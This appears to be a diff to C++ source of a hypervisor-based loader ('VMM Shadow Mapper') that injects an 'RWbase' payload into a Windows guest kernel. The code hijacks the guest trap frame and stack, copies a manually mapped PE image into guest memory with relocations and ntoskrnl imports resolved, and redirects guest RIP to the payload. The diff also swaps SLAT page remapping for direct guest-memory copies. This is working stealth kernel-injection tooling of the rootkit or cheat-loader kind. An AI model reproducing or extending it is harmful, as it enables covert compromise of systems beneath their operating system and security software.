@@ -1,4 +1,4 @@
-﻿﻿// =============================================================================
+﻿// =============================================================================
 // VMM Shadow Mapper - Payload Deployer (Business Management Module)
 // Coordinates loading of RWbase payloads
 // =============================================================================
@@ -15,7 +15,6 @@
 #include "modules/memory_manager/heap_manager.h"
 #include "modules/slat/slat.h"
 #include "modules/slat/cr3/cr3.h"
-#include "modules/slat/cr3/pte.h"
 #include "modules/arch/arch.h"
 #include <intrin.h>
 
@@ -169,8 +168,7 @@ static bool allocate_guest_memory(
         }
         if (reinterpret_cast<uint8_t*>(page) != 
             reinterpret_cast<uint8_t*>(vmm_base) + (i * 0x1000)) {
-            logs::print(ctx->log_ctx, "[Loader] ERROR: Non-contiguous allocation\n");
-            return false;
+            logs::print(ctx->log_ctx, "[Loader] WARNING: Non-contiguous allocation\n");
         }
     }
 
@@ -249,56 +247,6 @@ static bool map_sections(void* dest, const unsigned char* src, const size_t src_
     return true;
 }
 
-static bool map_payload_pages_to_guest(context_t* ctx, const allocation_info_t& alloc, const uint64_t target_guest_base)
-{
-    auto& slat_ctx = g_runtime_context.slat_ctx;
-    const cr3 hyperv_cr3 = slat::hyperv_cr3(&slat_ctx);
-    const cr3 hook_cr3 = slat::hook_cr3(&slat_ctx);
-
-    for (uint32_t i = 0; i < alloc.page_count; i++)
-    {
-        virtual_address_t guest_va = {};
-        guest_va.address = target_guest_base + (static_cast<uint64_t>(i) * 0x1000);
-
-        const uint64_t guest_physical = memory_manager::translate_guest_virtual_address(
-            ctx->guest_cr3, ctx->slat_cr3, guest_va, nullptr);
-
-        if (guest_physical == 0)
-        {
-            logs::print(ctx->log_ctx, "[Loader] ERROR: Guest VA not mapped: 0x%p\n", guest_va.address);
-            return false;
-        }
-
-        virtual_address_t guest_physical_va = {};
-        guest_physical_va.address = guest_physical;
-
-        slat_pte* const hyperv_pte = slat::get_pte(hyperv_cr3, guest_physical_va, slat_ctx.heap_ctx, 1);
-        slat_pte* const hook_pte = slat::get_pte(hook_cr3, guest_physical_va, slat_ctx.heap_ctx, 1);
-
-        if (hyperv_pte == nullptr || hook_pte == nullptr)
-        {
-            logs::print(ctx->log_ctx, "[Loader] ERROR: Failed to get SLAT PTE for 0x%p\n", guest_physical);
-            return false;
-        }
-
-        const uint64_t shadow_host_physical = memory_manager::unmap_host_physical(
-            reinterpret_cast<const uint8_t*>(alloc.vmm_mapped_address) + (static_cast<uint64_t>(i) * 0x1000));
-
-        hyperv_pte->page_frame_number = shadow_host_physical >> 12;
-        hyperv_pte->read_access = 1;
-        hyperv_pte->write_access = 1;
-        hyperv_pte->execute_access = 1;
-
-        hook_pte->page_frame_number = shadow_host_physical >> 12;
-        hook_pte->read_access = 1;
-        hook_pte->write_access = 1;
-        hook_pte->execute_access = 1;
-    }
-
-    slat::flush_current_logical_processor_cache(1);
-    return true;
-}
-
 // =============================================================================
 // RWbase Deployment
 // =============================================================================
@@ -309,7 +257,7 @@ static bool map_payload_pages_to_guest(context_t* ctx, const allocation_info_t& 
  * @param {const uint64_t} ntoskrnl_base 来宾 ntoskrnl 基址。
  * @return {deploy_result_t} 部署结果。
  */
-deploy_result_t deploy_rwbase_payload(context_t* ctx, const uint64_t ntoskrnl_base, const uint64_t target_guest_entry)
+deploy_result_t deploy_rwbase_payload(context_t* ctx, const uint64_t ntoskrnl_base)
 {
     if (!ctx) return deploy_result_t::memory_allocation_failed;
 
@@ -336,10 +284,6 @@ deploy_result_t deploy_rwbase_payload(context_t* ctx, const uint64_t ntoskrnl_ba
         if (!init_guest_discovery(ctx, ntoskrnl_base)) {
             logs::print(ctx->log_ctx, "[Loader] WARNING: Guest discovery init failed\n");
         }
-    }
-    else
-    {
-        set_discovery_cr3(ctx, arch::get_guest_cr3());
     }
 
     if (!validate_payload(payload::rwbase_image, payload::rwbase_image_size)) {
@@ -375,7 +319,7 @@ deploy_result_t deploy_rwbase_payload(context_t* ctx, const uint64_t ntoskrnl_ba
         return deploy_result_t::invalid_payload;
     }
 
-    const uint64_t target_va = target_guest_entry & ~0xFFFULL;
+    const uint64_t target_va = alloc.guest_virtual_base;
 
     logs::print(ctx->log_ctx, "[Loader] Fixing security cookie...\n");
     if (!fix_security_cookie(ctx, alloc.vmm_mapped_address, target_va)) {
@@ -400,17 +344,7 @@ deploy_result_t deploy_rwbase_payload(context_t* ctx, const uint64_t ntoskrnl_ba
     const uint32_t entry_rva = get_entry_point_rva(alloc.vmm_mapped_address);
     const uint64_t entry_va = target_va + entry_rva;
 
-    if (!map_payload_pages_to_guest(ctx, alloc, target_va)) {
-        logs::print(ctx->log_ctx, "[Loader] ERROR: Failed to map payload into Guest via SLAT\n");
-        ctx->deployment_state.store(0, std::memory_order_release);
-        return deploy_result_t::memory_allocation_failed;
-    }
-
     logs::print(ctx->log_ctx, "[Loader] RWbase ready at EP: 0x%p (Guest VA)\n", entry_va);
-
-    auto& inject_ctx = g_runtime_context.injection_ctx;
-    inject_ctx.payload_guest_base.store(target_va);
-    inject_ctx.payload_entry.store(entry_va);
 
     ctx->deployment_state.store(2, std::memory_order_release);
     return deploy_result_t::success;
@@ -455,16 +389,7 @@ bool prepare_allocation_hijack(context_t* ctx, void* trap_frame_ptr)
     // 4. Setup Stack (Shadow Space + Return Address)
     // We need to write to Guest Stack. We need to map Guest RSP to Host VA.
     // NOTE: This assumes we can access Guest RAM.
-    uint64_t guest_rsp = tf->rsp;
-    if (guest_rsp == 0)
-    {
-        guest_rsp = arch::get_guest_rsp();
-    }
-    if (guest_rsp == 0)
-    {
-        logs::print(ctx->log_ctx, "[Injection] ERROR: Guest RSP is zero. CR3=%p\n", arch::get_guest_cr3().flags);
-        return false;
-    }
+    const uint64_t guest_rsp = tf->rsp;
 
     // Stack Alignment Logic:
     // Windows x64 ABI requires RSP to be 16-byte aligned AFTER the CALL instruction pushes the return address.
@@ -492,44 +417,35 @@ bool prepare_allocation_hijack(context_t* ctx, void* trap_frame_ptr)
     
     // So: Align guest RSP down to 16, then subtract 0x28.
     // 0x20 (Shadow) + 0x8 (RetAddr) = 0x28.
-    if ((guest_rsp & 0xFFF) < 0x28)
-    {
-        return false;
-    }
+    const uint64_t new_rsp = aligned_base_rsp - 0x28;
 
-    uint64_t new_rsp = aligned_base_rsp - 0x28;
+    // Translate new_rsp to Host PA/VA
+    virtual_address_t gva_rsp = {};
+    gva_rsp.address = new_rsp;
 
-    uint8_t shadow_space[0x30] = {};
-    const uint64_t shadow_written = memory_manager::operate_on_guest_virtual_memory(
-        slat::hyperv_cr3(&g_runtime_context.slat_ctx),
-        shadow_space,
-        new_rsp,
+    const uint64_t guest_pa = memory_manager::translate_guest_virtual_address(
         arch::get_guest_cr3(),
-        sizeof(shadow_space),
-        memory_operation_t::write_operation
+        slat::hyperv_cr3(&g_runtime_context.slat_ctx), 
+        gva_rsp
     );
 
-    if (shadow_written != sizeof(shadow_space)) {
-        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to prepare Guest Stack. RSP=%p NewRSP=%p CR3=%p\n",
+    if (guest_pa == 0) {
+        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to translate Guest RSP. RSP=%p NewRSP=%p CR3=%p\n", 
             guest_rsp, new_rsp, arch::get_guest_cr3().flags);
         return false;
     }
 
-    uint64_t magic_return = injection_ctx_t::MAGIC_TRAP_RIP;
-    const uint64_t bytes_written = memory_manager::operate_on_guest_virtual_memory(
+    void* host_stack_ptr = memory_manager::map_guest_physical(
         slat::hyperv_cr3(&g_runtime_context.slat_ctx),
-        &magic_return,
-        new_rsp,
-        arch::get_guest_cr3(),
-        sizeof(magic_return),
-        memory_operation_t::write_operation
+        guest_pa
     );
-
-    if (bytes_written != sizeof(magic_return)) {
-        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to write Guest RSP. RSP=%p NewRSP=%p CR3=%p\n",
-            guest_rsp, new_rsp, arch::get_guest_cr3().flags);
-        return false;
+    if (!host_stack_ptr) {
+         logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to map Guest Stack\n");
+         return false;
     }
+
+    // Write Magic Trap Return Address
+    *reinterpret_cast<uint64_t*>(host_stack_ptr) = injection_ctx_t::MAGIC_TRAP_RIP;
 
     // 5. Update Trap Frame
     tf->rsp = new_rsp;
@@ -588,59 +504,104 @@ bool harvest_allocation_result(context_t* ctx, void* trap_frame_ptr)
 
 bool execute_payload_hijack(context_t* ctx, void* trap_frame_ptr)
 {
+    trap_frame_t* tf = reinterpret_cast<trap_frame_t*>(trap_frame_ptr);
     auto& inject_ctx = g_runtime_context.injection_ctx;
+
+    if (inject_ctx.allocated_buffer == 0) return false;
 
     // 1. Get Image Info
     const auto dos = reinterpret_cast<const image_dos_header_t*>(payload::rwbase_image);
     const auto nt = reinterpret_cast<const image_nt_headers64_t*>(payload::rwbase_image + dos->e_lfanew);
     const uint32_t image_size = nt->optional_header.size_of_image;
 
-    allocation_info_t alloc = {};
-    if (!allocate_guest_memory(ctx, image_size, &alloc)) {
-        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to allocate Guest memory for RWbase\n");
+    // 2. Allocate Temp Host Buffer (Must be contiguous for fixups)
+    const uint32_t pages_needed = (image_size + 0xFFF) / 0x1000;
+    void* temp_buffer = heap_manager::allocate_page(ctx->heap_ctx);
+    if (!temp_buffer) return false;
+
+    // Try to allocate contiguous pages
+    bool contiguous = true;
+    for (uint32_t i = 1; i < pages_needed; i++) {
+        void* page = heap_manager::allocate_page(ctx->heap_ctx);
+        if (!page) { contiguous = false; break; }
+        if (reinterpret_cast<uint8_t*>(page) != reinterpret_cast<uint8_t*>(temp_buffer) + (i * 0x1000)) {
+            contiguous = false;
+        }
+    }
+
+    if (!contiguous) {
+        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to allocate contiguous temp buffer\n");
+        // Leak for now or implement proper cleanup
         return false;
     }
 
-    crt::set_memory(alloc.vmm_mapped_address, 0, image_size);
-    if (!map_sections(alloc.vmm_mapped_address, payload::rwbase_image, payload::rwbase_image_size)) {
+    // 3. Map Sections to Temp Buffer
+    crt::set_memory(temp_buffer, 0, image_size);
+    if (!map_sections(temp_buffer, payload::rwbase_image, payload::rwbase_image_size)) {
         logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to map sections\n");
         return false;
     }
 
-    const uint64_t target_va = alloc.guest_virtual_base;
-    inject_ctx.allocated_buffer = target_va;
+    const uint64_t target_va = inject_ctx.allocated_buffer;
 
     // 4. Fix Security Cookie
-    if (!fix_security_cookie(ctx, alloc.vmm_mapped_address, target_va)) {
+    if (!fix_security_cookie(ctx, temp_buffer, target_va)) {
         logs::print(ctx->log_ctx, "[Injection] WARNING: Cookie fix failed\n");
     }
 
     // 5. Apply Relocations
-    if (!apply_relocations(ctx, alloc.vmm_mapped_address, target_va)) {
+    if (!apply_relocations(ctx, temp_buffer, target_va)) {
         logs::print(ctx->log_ctx, "[Injection] ERROR: Relocation failed\n");
         return false;
     }
 
     // 6. Resolve Imports
-    if (!resolve_payload_imports(ctx, alloc.vmm_mapped_address, g_runtime_context.ntoskrnl_base)) {
+    if (!resolve_payload_imports(ctx, temp_buffer, g_runtime_context.ntoskrnl_base)) {
         logs::print(ctx->log_ctx, "[Injection] ERROR: Import resolution failed\n");
         return false;
     }
 
-    ctx->guest_cr3 = arch::get_guest_cr3();
-    ctx->slat_cr3 = slat::hyperv_cr3(&g_runtime_context.slat_ctx);
+    // 7. Copy to Guest Memory
+    const uint64_t start_va = inject_ctx.allocated_buffer;
+    
+    for(uint64_t i=0; i < pages_needed; i++) {
+        uint64_t curr_va = start_va + (i * 0x1000);
+        
+        virtual_address_t gva = {};
+        gva.address = curr_va;
 
-    if (!map_payload_pages_to_guest(ctx, alloc, target_va)) {
-        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to map payload into Guest via SLAT\n");
-        return false;
+        uint64_t guest_pa = memory_manager::translate_guest_virtual_address(
+            arch::get_guest_cr3(),
+            slat::hyperv_cr3(&g_runtime_context.slat_ctx), 
+            gva
+        );
+        
+        if (guest_pa == 0) {
+            logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to translate allocated buffer VA 0x%p\n", curr_va);
+            return false;
+        }
+
+        void* host_ptr = memory_manager::map_guest_physical(
+            slat::hyperv_cr3(&g_runtime_context.slat_ctx),
+            guest_pa
+        );
+
+        if (!host_ptr) {
+             logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to map allocated buffer PA 0x%p\n", guest_pa);
+             return false;
+        }
+
+        // Copy page from temp buffer
+        crt::copy_memory(host_ptr, reinterpret_cast<uint8_t*>(temp_buffer) + (i * 0x1000), 0x1000);
+    }
+
+    // 8. Free Temp Buffer
+    for(uint32_t i=0; i < pages_needed; i++) {
+        heap_manager::free_page(ctx->heap_ctx, reinterpret_cast<uint8_t*>(temp_buffer) + (i * 0x1000));
     }
 
     // 9. Set RIP to EntryPoint
-    const uint64_t entry_va = target_va + nt->optional_header.address_of_entry_point;
-    inject_ctx.payload_guest_base.store(target_va);
-    inject_ctx.payload_entry.store(entry_va);
-
-    slat::flush_current_logical_processor_cache(1);
+    const uint64_t entry_va = start_va + nt->optional_header.address_of_entry_point;
     arch::set_guest_rip(entry_va);
     
     // 10. Clear TF (Trap Flag)
